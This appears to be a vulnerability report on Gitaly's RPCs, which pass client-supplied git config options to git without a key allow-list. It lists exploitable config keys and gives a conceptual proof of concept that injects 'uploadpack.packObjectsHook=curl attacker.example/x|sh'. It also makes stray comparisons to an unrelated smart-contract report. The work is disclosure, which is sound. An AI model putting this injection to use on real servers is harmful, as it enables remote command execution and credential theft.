### Title
Unfiltered client-supplied `git_config_options` allow injection of dangerous Git configuration keys - (File: internal/git/gitcmd/command_options.go)

### Summary
Multiple RPCs (`InfoRefsUploadPack`, `PostUploadPackWithSidechannel`, `SSHUploadPackWithSidechannel`, `PostReceivePack`, `SSHReceivePack`) accept a client-controlled `git_config_options` field of arbitrary `key=value` strings, which are converted via `gitcmd.ConvertConfigOptions` and passed straight through to `git` as `-c key=value` global options with no allow-list of permitted configuration keys — an unfiltered "powerful call" analogous to `LSSVMPair.call()` accepting arbitrary function selectors.

### Finding Description
`gitcmd.ConvertConfigOptions` only validates that a client-supplied config string can be split into a `key` and `value` on `=`; it performs no check on which keys are permitted: [1](#0-0) 

The resulting `ConfigPair` values are only checked for generic syntactic validity (must contain a section, no embedded `=`, no leading/trailing dot, regex on characters) in `GitConfig.Validate()` / `GlobalArgs()` — there is no semantic allow-list restricting which Git configuration variables can be set: [2](#0-1) 

These client-supplied options are wired directly into request handlers that spawn `git upload-pack`/`git receive-pack` with `WithConfig(config...)`, e.g. in the SSH `upload-pack` path: [3](#0-2) [4](#0-3) 

and in the smart-HTTP `receive-pack` path: [5](#0-4) 

The `commandDescriptions` allow-list in `internal/git/gitcmd/command_description.go` restricts *subcommand names* and adds hardening config for known-dangerous behaviors (e.g., disabling `http.followRedirects` for `fetch`/`clone`/`remote`), which shows the project is aware that uncontrolled Git config is a security-relevant surface — but that same discipline is not applied to the free-form `-c` options supplied by the RPC caller through `GitConfigOptions`.

### Impact Explanation
Git has multiple configuration keys that, if attacker-controlled, enable execution of arbitrary commands or exfiltration of sensitive data on the Gitaly host, e.g.:
- `uploadpack.packObjectsHook` — replaces the pack-objects invocation with an arbitrary command during `upload-pack`.
- `core.fsmonitor` — invokes an arbitrary command as a "file system monitor" hook.
- `credential.helper` — can be pointed at an arbitrary executable to leak stored credentials.
- `http.proxy` / `http.*.proxy` — can be used for SSRF against internal endpoints reachable from the Gitaly host.
- `include.path` — can cause `git` to read/merge in attacker-chosen file paths as configuration.

Since these RPCs are reachable via ordinary Git operations (`git clone`/`fetch`/`push` over SSH or HTTP, or a crafted RPC field), an unprivileged client that can reach these Gitaly RPCs may be able to escalate to remote command execution on the Gitaly node or exfiltrate credentials, similar in class to the original `call()` risk of invoking arbitrary, unfiltered functionality.

### Likelihood Explanation
Medium: the `git_config_options` field is a standard, documented request field on public-facing Gitaly RPCs used for every `git fetch`/`push`/clone operation, so the field is directly reachable by any authenticated Git client. Exploitability depends on whether Gitaly's request-parsing (gitlab-shell / Workhorse) already restricts which config keys are forwarded before reaching Gitaly, which could not be confirmed from the code inspected here — this component is outside the Gitaly repository. Within Gitaly itself, no key allow-list exists at the point the string is converted and applied.

### Recommendation
Introduce an explicit allow-list of Git configuration keys permitted via client-supplied `GitConfigOptions` (analogous to filtering `pairTransferERC20From()` etc. in the original report), rejecting any key not on the list (e.g., only allow `uploadpack.*`/`receive.*`/`transfer.hideRefs`/`http.followRedirects`-safe keys actually needed for negotiation) inside `ConvertConfigOptions` or immediately before it is consumed by `gitcmd.WithConfig`, rather than relying solely on generic syntax validation in `GitConfig.Validate()`.

### Proof of Concept
Conceptual (not executed against a live instance): a client issuing an `SSHUploadPackWithSidechannelRequest` or `PostUploadPackWithSidechannelRequest` with
```
git_config_options: ["uploadpack.packObjectsHook=curl attacker.example/x|sh"]
```
would have this value validated only for syntactic well-formedness by `GitConfig.Validate()` and then passed to `git upload-pack` as `-c uploadpack.packObjectsHook=...`, causing Gitaly's `git` invocation to execute the attacker-controlled command when it services the pack-objects request, as wired through `WithReceivePackHooks`/`WithConfig` in `internal/gitaly/service/ssh/upload_pack.go` and `internal/gitaly/service/smarthttp/receive_pack.go`.

// ConvertConfigOptions converts `<key>=<value>` config entries into `ConfigPairs`.
func ConvertConfigOptions(options []string) ([]ConfigPair, error) {
	configPairs := make([]ConfigPair, len(options))

	for i, option := range options {
		configPair := strings.SplitN(option, "=", 2)
		if len(configPair) != 2 {
			return nil, fmt.Errorf("cannot convert invalid config key: %q", option)
		}

		configPairs[i] = ConfigPair{Key: configPair[0], Value: configPair[1]}
	}

	return configPairs, nil
}

// Validate validates that the Git configuration conforms to a format that Git understands.
func (cfg GitConfig) Validate() error {
	// Even though redundant, this block checks for a few things up front to give better error
	// messages to the administrator in case any of the keys fails validation.
	if cfg.Key == "" {
		return cfgerror.NewValidationError(cfgerror.ErrNotSet, "key")
	}
	if strings.Contains(cfg.Key, "=") {
		return cfgerror.NewValidationError(
			fmt.Errorf(`key %q cannot contain "="`, cfg.Key),
			"key",
		)
	}
	if !strings.Contains(cfg.Key, ".") {
		return cfgerror.NewValidationError(
			fmt.Errorf("key %q must contain at least one section", cfg.Key),
			"key",
		)
	}
	if strings.HasPrefix(cfg.Key, ".") || strings.HasSuffix(cfg.Key, ".") {
		return cfgerror.NewValidationError(
			fmt.Errorf("key %q must not start or end with a dot", cfg.Key),
			"key",
		)
	}

	if !configKeyRegex.MatchString(cfg.Key) {
		return cfgerror.NewValidationError(
			fmt.Errorf("key %q failed regexp validation", cfg.Key),
			"key",
		)
	}

	return nil
}

// GlobalArgs generates a git `-c <key>=<value>` flag. Returns an error if `Validate()` fails to
// validate the config key.
func (cfg GitConfig) GlobalArgs() ([]string, error) {
	if err := cfg.Validate(); err != nil {
		return nil, fmt.Errorf("invalid configuration key %q: %w", cfg.Key, err)
	}

	return []string{"-c", fmt.Sprintf("%s=%s", cfg.Key, cfg.Value)}, nil
}
